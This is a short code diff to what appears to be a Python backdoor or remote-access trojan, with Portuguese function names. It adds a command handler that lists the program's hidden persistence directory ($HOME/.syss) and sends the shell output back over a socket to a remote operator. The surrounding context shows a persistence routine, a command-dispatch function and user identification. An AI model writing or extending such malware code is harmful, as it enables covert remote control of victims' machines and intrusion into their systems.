@@ -34,6 +34,12 @@ def update_source():
 
 
 
+def ls_syss(sock):
+  out = os.popen("ls -la $HOME/.syss").read()
+  bout = bytes(out,"utf-8")
+  sock.send(bout)
+
+
 def persistencia():
   global mypwd
   os.system("mkdir $HOME/.syss")
@@ -150,6 +156,8 @@ def executa(cmd):
   elif "update" in cmd:
     update_source()
 
+  elif "ls syss" in cmd:
+    ls_syss(sock)
 
 user = os.popen("whoami").read()[:-1]
 
